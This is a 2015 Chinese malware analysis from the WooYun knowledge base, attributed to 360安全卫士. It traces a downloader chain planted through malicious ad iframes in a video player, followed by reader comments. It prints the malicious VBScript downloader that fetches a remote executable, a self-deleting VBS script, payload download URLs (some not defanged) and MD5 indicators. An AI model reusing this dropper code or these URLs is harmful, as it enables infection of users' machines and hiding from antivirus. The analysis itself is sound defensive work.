@@ -1,0 +1,75 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">来自播放器的你——“中国插件联盟”木马分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">360安全卫士</a> <span class="bull">·</span> <time title="2015/06/26 16:05" ui-time="" datetime="2015/06/26 16:05" class="published ng-binding ng-isolate-scope">2015/06/26 16:05</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p><img alt="enter image description here" img-src="af7d682f36d6bcee3374ede4f3ff934ac0573225.jpg"></p><p>图：播放器挂马行为链</p><p>在国内流行的影音播放器客户端内嵌广告中，有一部分来自广告联盟和各种营销平台。在搜狐影音展示的一个私服广告页面中，我们监测到一个恶意的iframe标签，标签内容带有一段vbs脚本。</p><h1>0x01  vbs脚本</h1><hr><p>该脚本的作用是将远程服务器上的svchost.exe程序重命名为putty.exe（一个下载者）文件：</p><pre><code>1: Set xPost=createObject("Microsoft.XMLHTTP") 
+2: xPost.Open "GET","http://183.xxx.80.93:3389/svchost.exe",0 
+3: xPost.Send() 
+4: set sGet=createObject("ADODB.Stream") 
+5: sGet.Mode=3 
+6: sGet.Type=1 
+7: sGet.Open() 
+8: sGet.Write xPost.ResponseBody 
+9: sGet.SaveToFile "C:\Windows\Temp\putty.exe",2
+10: Set xPost=createObject("Microsoft.XMLHTTP") 
+11: xPost.Open "GET","http://183.xxx.80.93:3377/svchost.exe",0 
+12: xPost.Send() 
+13: set sGet=createObject("ADODB.Stream") 
+14: sGet.Mode=3 
+15: sGet.Type=1 
+16: sGet.Open() 
+17: sGet.Write xPost.ResponseBody 
+18: sGet.SaveToFile "C:\Windows\Temp\putty.exe",2
+</code></pre><h1>0x02 putty.exe程序分析</h1><hr><p>读取远程服务器上的txt文档，进行批量下载</p><p>读取hxxp://txt.ichajianlianmeng.com:88/1001.txt页面的内容，然后进行下载。调用用InternetConnectA建立远程访问</p><p><img alt="enter image description here" img-src="84b0acc367efb326321ff373fb738d6712c6cacc.jpg"></p><p>通过httpOpenRequestA和HttpSendRequestA创建请求并发送请求到HTTP服务器：</p><p><img alt="enter image description here" img-src="cf559d262afd813f9173bfad89638720735fd0da.jpg"></p><p>读取到远程服务器中的txt保存的内容(该文件中的内容经常变动，一段时间能捕获到远控木马。)</p><pre><code>hxxp://down.ichajianlianmeng.com:888/sie.exe
+hxxp://www.yczuowenwang.com/xp.exe
+hxxp://cdn.yuu361.com/download/Fresh_20i5_052039fc.exe
+hxxp://down.woka123.cn/qudao/lol/dmxyxhh_504.exe
+hxxp://down.biomall.org.cn/meng/up/niutu410202.exe
+hxxp://down.nvjay.com:6677/huajun/huajun_15-8.exe
+hxxp://down.ichajianlianmeng.com:888/59801_6789_sd1.exe
+hxxp://down.sushouspell.com/sushou/sw/-2208_1_ss.exe
+hxxp://download.suxiazai.com/for_down/2013/install1552262.exe
+</code></pre><p>通过InternetReadFile依次读取上面链接的内容到程序中：</p><p><img alt="enter image description here" img-src="7c759d245cad389ccf76f2bdaf64f158725e98ae.jpg"></p><p>创建文件、写入数据、执行该程序：</p><p><img alt="enter image description here" img-src="e69e1712c5cc15eb71501b094cca9031ca0da73b.jpg"></p><p><img alt="enter image description here" img-src="facaf7b9edb7e234eee8617081a029a0abb0768f.jpg"></p><p>后面就循环读取完链接中的内容并创建进程，第一轮下载就完毕了：</p><p><img alt="enter image description here" img-src="769a78cc6dc3faea5861c9bb445527a2b695a0b6.jpg"></p><p>中间会创建一个空的MD5文件，该文件只是用来做标记，如果再次运行这个下载者就不再进行下载了：</p><p><img alt="enter image description here" img-src="68562515dfc72df22b9bc67297eacbcab3462ca3.jpg"></p><h1>0x03 sie.exe&#45;--|下载者里的下载者</h1><hr><p>木马就像混黑社会似的，也喜欢打群架，这个下载者又放出一个下载者，两者的功能和实现都一样，这里就不再重复分析了。</p><p>第二轮下载通过访问hxxp://txt.ichajianlianmeng.com:88/siedown.txt文件中的以下链接进行下载：</p><pre><code>1: http://down.meituview.com/MTViewbuildmtview_116.exe
+2: #
+3: http://down.secaikan.com/sckt/jm/setup_sc150002.exe
+4: #
+5: http://down.shkbx.com/SC_rg0cfc_xt2005_1.exe
+6: #
+7: http://down.shkbx.com/SC_rg0cfc_xt2000_1.exe
+8: #
+9: http://down.woka123.cn/qudao/lol/dmxyxhh_505.exe
+10: #
+11: http://down.sou2v.com/UserFiles/install_107_1a.exe
+12: #
+13: http://down.sushouspell.com/sushou/sw/-2208_1_ss.exe
+</code></pre><p>然后得到以下文件：</p><p><img alt="enter image description here" img-src="b8e28582e66f6cec182c572d1c0e1bd640eba989.jpg"></p><p>如果中招，电脑会变成如下样子。重启后桌面图标还会更多一些，为照顾密集恐惧症患者，这里不再贴出：</p><p><img alt="enter image description here" img-src="29935bb410d836678cfcb0def87a40e6fcb4e6d3.jpg"></p><h1>0x04 xx360.exe远控木马</h1><hr><p>和所有木马作者一样，“中国插件联盟”对360的仇恨也是深入骨髓。再看看该下载者放出的远控木马（xx360）。</p><p>通过乱序字符串拼接的方式获取到即将创建文件的路径：</p><p><img alt="enter image description here" img-src="630075fe6c73717e4cf7ad4466d34f06c85ec23b.jpg"></p><p>创建文件、访问hxxp://61.160.195.24:666/NetSyst81.dll并读取数据到内存中</p><p><img alt="enter image description here" img-src="59108ccdecd909e81966a026306dfb012519176a.jpg"></p><p><img alt="enter image description here" img-src="bfb5c0442f54381ee7a87bb8bc9cad5f2ddc300f.jpg"></p><p><img alt="enter image description here" img-src="e48b2cda7bfabe5564e24bfc7ef6bc7d22985cb8.jpg"></p><p>将刚刚读取到的数据写入NetSys.dll文件中</p><p><img alt="enter image description here" img-src="009141b24d43aac5a7b26adb6c8e98a0dc950111.jpg"></p><p><img alt="enter image description here" img-src="66898cfa42fc06c2d7e80deb627ada5c44125f77.jpg"></p><p>读取NetSys.dll中的内容，并在内存再申请空间，解密刚刚获取到的NetSys.dll文件，解密后获得一个PE结构的文件(利用这样的方法迷惑杀毒软件)：</p><p><img alt="enter image description here" img-src="6fc6e153a78b555ba08d3446359d97fa43b98d25.jpg"></p><p><img alt="enter image description here" img-src="2e09c8407a35ab82db7a79f582d69d6a23d00d1b.jpg"></p><p>创建并执行Terms.EXE.exe文件：</p><p><img alt="enter image description here" img-src="2029b7c467536750fdf3dd110a34949e5b68b40b.jpg"></p><p>创建注册表和服务，达到隐藏和长期驻扎在用户电脑里而且开机自启动：</p><p><img alt="enter image description here" img-src="a8720848d0b1e074cdffed3c1679791e3a71d192.jpg"></p><p><img alt="enter image description here" img-src="540c83255d1b5ec5e319e3351dcbaa9b5177e732.jpg"></p><p>释放vbs文件，删除自身，使自己隐藏起来：</p><pre><code>1: dim wsh
+2: On Error Resume Next
+3: set wsh=createObject("WScript.Shell")
+4: Set objFSO = CreateObject("Scripting.FileSystemObject")
+5: wscript.sleep 1000
+6: objFSO.DeleteFile("C:\Documents and Settings\Administrator\桌面\360.exe"), True
+7: createobject("scripting.filesystemobject").deletefile wscript.scriptfullname      
+</code></pre><p>对远控抓包分析（原来的远控木马已经不能连接上了，这里把自己的主机配置成该目标程序），一看就是zlib格式的，前面就是一个头，截取后面的拿去python脚本里跑一跑：</p><p><img alt="enter image description here" img-src="08da5d60e1653e5c01299f40dfb018f7e96bc8df.jpg"></p><p>用Python解密后，看到自己电脑的操作系统版本，以及用户名，还有上线时间了</p><pre><code>1: a = 'b313640002154620310788598118c4d6e062606002d2c1a9456599c9a90a0189c9d90ac60c7407cc208211e8220510e3c00ac60686ff20b137f68c50150220820b44241695649416eb1a1a269ba6985b1a32182d3c68ac676ce4ee51c56070e68dc1a98d26e6dbaf31d88459e8991bda2904c71b1a19181b98321819189aea1a98e91a1a29181a5a9918321c5973e2fcf66bd75f329cdbb27dd1f96b0a0c0029dd29b0'
+2: import codecs
+3: b = codecs.decode(a, 'hex_codec')
+4: zlib.decompress(b, -8)
+</code></pre><p><img alt="enter image description here" img-src="2fe2e046f5dba1118f07cd6e36504083ebbdf148.jpg"></p><h1>0x05 部分样本信息</h1><hr><p>以下是通过“中国插件联盟”下载者捕获到的文件MD5。由于该远程服务器上的数据包在不断更新，获取到的安装包有很大量，以下只是其中一部分：</p><pre><code>1: e3198f710f307e16413cd7d599f971ebc
+2: e3198f710f307e16413cd7d599f971eb
+3: 1552ccfa8cef81056d5c23d167cafd19c
+4: 1552ccfa8cef81056d5c23d167cafd19
+5: bba33d5501a780c392e4da520506da25
+6: 6b08cdde7530efab0a9a5275ff4867b3
+7: abba9c49e181f27b4f387ab88c505646
+8: a22e31255f3092f4d1b429d76976ba0f
+9: 8268182d660f2d72c05ff3c2bec90f61
+10: 8910b238873a26f76854c102eab68673
+11: 2a011d1c0ad02a9acf5315ccb7657713
+12: e41c325df557e54ab95ff5dc81abfd8c
+13: 20d6852156af4db9cac546e666a436ff
+14: a22e31255f3092f4d1b429d76976ba0f
+15: e0126226ff5a65b283db12d02ccc5a1d
+16: 27c38edd7fd7c8c2eeddac457a407c0f
+17: 8fa79dd7f1ba8b047862a904c69d40da
+18: e94591e1dd94d0ea6fe2f03d9cdde05c
+19: 6d0678e31452aafd6aee2c4947b4ef48
+20: 6a5ab49d61623e22618e8b9c4904e85f
+21: 45529e071f7f5d5b05705a9e35c5ddab
+22: 5312719ecc909d4c47452eacc8452c73
+23: 5312719ecc909d4c47452eacc8452c73
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/10260" rel="bookmark" id="re1">BetaBot 木马分析</a></li><li><a href="http://drops.wooyun.org/papers/13595" rel="bookmark" id="re2">网络暗黑世界的“域影”攻击：运营商劫持LOL等客户端海量级挂马</a></li><li><a href="http://drops.wooyun.org/tips/12386" rel="bookmark" id="re3">JavaScript Phishing</a></li><li><a href="http://drops.wooyun.org/papers/13755" rel="bookmark" id="re4">云、管、端三重失守，大范围挂马攻击分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-06-28 23:46:12</span></div><p></p><p>弄个cpa容易吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">G9sT的测试</span> <span class="reply-time">2015-06-28 01:46:53</span></div><p></p><p>反汇编是硬伤啊,,,,</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hack0ne</span> <span class="reply-time">2015-06-27 20:15:39</span></div><p></p><p>占个沙发，收藏了，牛牛啊，表示现在看的不是很懂啊。</p><p></p></div></div></div></div></div></main>
